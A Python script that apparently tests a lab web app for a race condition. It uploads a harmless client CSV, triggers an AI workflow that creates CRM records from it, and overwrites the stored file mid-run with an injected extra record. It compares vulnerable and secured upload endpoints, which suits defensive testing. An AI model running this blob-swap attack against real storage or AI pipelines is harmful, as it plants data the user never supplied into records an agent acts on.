import threading
import time
from datetime import datetime, timezone

import httpx


def _wall():
    return datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3]


# --- endpoints (localhost from host; Docker maps ports) ---

WEBAPP = "http://127.0.0.1:8000".rstrip("/")
BLOB = "http://127.0.0.1:9000".rstrip("/")

# Delay between starting workflow thread and overwriting the blob (ms). sweep_delay sets this.
DELAY_MS = 0

# --- payloads ---

CSV_BODY = """Client list for CRM import
Name,Contact,Company
Jane Doe,jane@example.com,Acme Inc
John Smith,john@example.com,Globex
"""

EVIL_EXTRA = """
---1234123423123412342134324---
Bob Martinez,bob@sk-acme-fake-abc123xyz.example.com,Globex
"""

USER_ASK = (
    "Create CRM records from this document. Summarize each record you created including name and contact."
)

_last_doc_id = None


def _post_upload(upload_path: str) -> tuple[int, str]:
    r = httpx.post(
        f"{WEBAPP}{upload_path}",
        files={"file": ("clients.csv", CSV_BODY.encode(), "text/csv")},
        timeout=30,
    )
    r.raise_for_status()
    j = r.json()
    doc_id = j["document_id"]
    key = j["saved_as"]
    return doc_id, key


def _overwrite_blob(storage_key: str) -> None:
    body = (CSV_BODY + "\n\n" + EVIL_EXTRA).encode()
    httpx.put(
        f"{BLOB}/object/{storage_key}",
        content=body,
        timeout=10,
    ).raise_for_status()


def run_case(upload_path, *, quiet: bool = False):
    global _last_doc_id

    doc_id, storage_key = _post_upload(upload_path)
    _last_doc_id = doc_id

    result_code = None
    result_text = ""

    def hit_workflow():
        nonlocal result_code, result_text
        if not quiet:
            print(f"    [ATTACKER {_wall()}] doc={doc_id} event=workflow_post_start")
        w = httpx.post(
            f"{WEBAPP}/api/workflow",
            json={"document_id": doc_id, "user_prompt": USER_ASK},
            timeout=120,
        )
        if not quiet:
            print(f"    [ATTACKER {_wall()}] doc={doc_id} event=workflow_post_done  status={w.status_code}")
        result_code = w.status_code
        result_text = w.text

    thread = threading.Thread(target=hit_workflow)
    thread.start()

    if DELAY_MS > 0:
        time.sleep(DELAY_MS / 1000.0)

    if not quiet:
        print(f"    [ATTACKER {_wall()}] doc={doc_id} event=blob_overwrite_start  delay_ms={DELAY_MS}")
    _overwrite_blob(storage_key)

    if not quiet:
        print(f"    [ATTACKER {_wall()}] doc={doc_id} event=blob_overwrite_done")

    thread.join()
    return result_code, result_text


if __name__ == "__main__":
    tests = [
        ("vulnerable", "/api/upload/vulnerable"),
        ("secure", "/api/upload/secure"),
        ("secure_ts", "/api/upload/secure-timestamp"),
    ]

    for label, path in tests:
        print()
        print("---", label, "---", path)
        try:
            code, body = run_case(path)
        except Exception as e:
            print("error:", e)
            continue

        print("status:", code)
        print(body)
